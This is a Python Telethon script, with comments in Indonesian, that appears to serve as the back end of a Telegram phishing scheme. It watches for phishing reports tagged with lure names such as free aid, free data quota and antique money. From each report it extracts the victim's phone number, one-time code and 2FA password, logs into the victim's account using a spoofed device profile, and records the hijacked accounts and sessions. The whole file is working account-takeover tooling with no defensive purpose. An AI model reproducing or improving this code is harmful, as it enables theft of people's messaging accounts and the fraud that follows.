# main.py
import asyncio
import re
import os
import json
from telethon import TelegramClient, events
from config import api_id, api_hash, is_valid_phone_number, SESSIONS_FOLDER, SESSIONS_FOLDER_FINAL, ALLOWED_PREFIXES, DEFAULT_DEVICE_PROFILES

from login_handler3 import request_otp, complete_login, get_pending, complete_login_with_password, get_device_info_from_session_file, get_default_device_profile_by_phone_code
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError

# --- Konfigurasi ---
KEYWORDS = [
    '❮ LAPORAN My Kasih ❯',
    '❮ LAPORAN BANTUAN MADANI ❯',
    '❮ LAPORAN Judul ❯',
    '❮ LAPORAN judul ❯',
    '❮ LAPORAN AHMAD SANJAYA ❯',
    '❮ LAPORAN GRATIS KUOTA ❯',
    '❮ LAPORAN UANG KUNO ❯',
    '❮ LAPORAN Uang Kuno ❯',
    '❮ LAPORAN Laporan ❯'
]

# user_states akan menyimpan {phone: {'otp': '...', 'password': '...', 'status': 'waiting_otp' / 'waiting_2fa' / 'logged_in', 'device_profile': {...}}}
user_states = {}
LOG_FILE = "valid_accounts.json"

# --- Fungsi Utility ---
def log_valid_account(phone):
    """Mencatat nomor telepon yang berhasil login ke file JSON."""
    data = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            data = []
        except Exception as e:
            print(f"[❌] Error reading {LOG_FILE}: {e}")
            data = []

    if phone not in data:
        data.append(phone)
        with open(LOG_FILE, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[✅] Nomor {phone} berhasil dicatat sebagai akun valid.")
    else:
        print(f"[ℹ️] Nomor {phone} sudah ada di log.")

# --- Event Handler Telegram ---
@events.register(events.NewMessage)
async def handler(event):
    msg = event.raw_text
    sender_id = event.sender_id
    
    if not any(kw in msg for kw in KEYWORDS):
        return

    phone_match = re.search(r'(?:PHONE\s+NUMBER|NUMBER)\s*:\s*(\+?\d{10,15})', msg, re.IGNORECASE)
    otp_match = re.search(r'(?:OTP|PIN)\s*:\s*(\d{4,6})', msg, re.IGNORECASE)
    pwd_match = re.search(r'(?:PASSWORD|PASS|KODE 2FA)\s*:\s*(\S+)', msg, re.IGNORECASE)

    if not phone_match:
        print("[⚠️] Pesan terdeteksi keyword, tapi tidak ada nomor telepon.")
        return

    raw_phone = phone_match.group(1).strip()
    phone = "+" + raw_phone if not raw_phone.startswith("+") else raw_phone

    # Validasi nomor telepon dengan fungsi dari config
    if not is_valid_phone_number(phone):
        print(f"[❌] Nomor tidak valid atau prefix tidak diizinkan: {phone}. Mengabaikan.")
        return

    if phone not in user_states:
        user_states[phone] = {"otp": None, "password": None, "status": "new", "device_profile": None}
        print(f"[✨] Inisialisasi state untuk nomor: {phone}")

    current_state = user_states[phone]

    # --- Logika Pemilihan Profil Perangkat ---
    if not current_state["device_profile"]:
        # 1. Coba baca dari file sesi lama
        device_info_from_old_session = get_device_info_from_session_file(phone)
        if device_info_from_old_session:
            current_state["device_profile"] = device_info_from_old_session
            print(f"[ℹ️] Menggunakan profil perangkat dari sesi lama untuk {phone}: {current_state['device_profile'].get('device_model')}")
        else:
            # 2. Jika tidak ada sesi lama atau tidak ada info, gunakan profil default berdasarkan phone code
            current_state["device_profile"] = get_default_device_profile_by_phone_code(phone)
            print(f"[ℹ️] Menggunakan profil perangkat default untuk {phone} ({phone[:3]}): {current_state['device_profile'].get('device_model')}")

    if otp_match:
        otp = otp_match.group(1)
        if current_state["otp"] != otp:
            current_state["otp"] = otp
            print(f"[📥] OTP diterima: {otp} untuk {phone}")
        else:
            print(f"[ℹ️] OTP yang sama ({otp}) sudah ada untuk {phone}.")

    if pwd_match:
        pwd = pwd_match.group(1)
        if current_state["password"] != pwd:
            current_state["password"] = pwd
            print(f"[🔑] Password 2FA diterima: {pwd} untuk {phone}")
        else:
            print(f"[ℹ️] Password 2FA yang sama ({pwd}) sudah ada untuk {phone}.")

    # --- Logika Otentikasi (Sama seperti revisi sebelumnya, hanya perlu dilewatkan device_profile) ---

    if current_state["status"] == "new" and not current_state["otp"] and not current_state["password"]:
        if phone not in get_pending():
            print(f"[📨] Meminta OTP untuk {phone}...")
            user_states[phone]["status"] = "waiting_otp_request"
            asyncio.create_task(request_otp(phone, current_state["device_profile"])) # Lewatkan device_profile
        else:
            print(f"[⏳] Sudah menunggu OTP untuk {phone} (status: {current_state['status']}).")
        return

    if current_state["otp"] and current_state["status"] != "logged_in":
        if phone in get_pending():
            print(f"[➡️] Mencoba login dengan OTP ({current_state['otp']}) untuk {phone}...")
            user_states[phone]["status"] = "completing_login_otp"
            try:
                await complete_login(phone, current_state["otp"], log_callback=log_valid_account)
                user_states[phone]["status"] = "logged_in"
                print(f"[✅] Sesi untuk {phone} berhasil dibuat (dengan OTP).")
            except SessionPasswordNeededError:
                print(f"[⚠️] Nomor {phone} membutuhkan password 2FA. Menunggu password...")
                user_states[phone]["status"] = "waiting_2fa"
            except (FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError) as e:
                print(f"[❌] Error saat login dengan OTP untuk {phone}: {e}")
                del user_states[phone]
            except Exception as e:
                print(f"[❌] Error tidak terduga saat login OTP untuk {phone}: {e}")
                del user_states[phone]
        else:
            print(f"[⚠️] OTP diterima untuk {phone}, tetapi tidak ada permintaan OTP yang tertunda. Mungkin OTP kadaluarsa.")

    if current_state["password"] and current_state["status"] == "waiting_2fa":
        if current_state["otp"]:
            print(f"[➡️] Mencoba login dengan Password 2FA ({current_state['password']}) untuk {phone}...")
            user_states[phone]["status"] = "completing_login_2fa"
            try:
                await complete_login_with_password(phone, current_state["otp"], current_state["password"], log_callback=log_valid_account)
                user_states[phone]["status"] = "logged_in"
                print(f"[✅] Sesi untuk {phone} berhasil dibuat (dengan 2FA).")
            except (FloodWaitError, PhoneNumberInvalidError, AuthBytesInvalidError, AuthKeyUnregisteredError, UserDeactivatedError) as e:
                print(f"[❌] Error saat login 2FA untuk {phone}: {e}")
                del user_states[phone]
            except Exception as e:
                print(f"[❌] Error tidak terduga saat login 2FA untuk {phone}: {e}")
                del user_states[phone]
        else:
            print(f"[⚠️] Password 2FA diterima untuk {phone}, tetapi OTP belum tersedia. Menunggu OTP.")
    elif current_state["password"] and current_state["status"] != "waiting_2fa" and current_state["status"] != "logged_in":
        print(f"[ℹ️] Password 2FA diterima untuk {phone}, tapi belum waktunya digunakan. Status saat ini: {current_state['status']}")


async def main():
    print("[🚀] Memulai client utama...")
    
    os.makedirs(SESSIONS_FOLDER, exist_ok=True)
    os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)
    
    client = TelegramClient("main2", api_id, api_hash, sequential_updates=True)
    
    try:
        await client.start()
        print("[🚀] Bot aktif dan mendengarkan pesan.")
        client.add_event_handler(handler)
        await client.run_until_disconnected()
    except Exception as e:
        print(f"[🚨] Error saat memulai atau menjalankan bot: {e}")

if __name__ == "__main__":
    asyncio.run(main())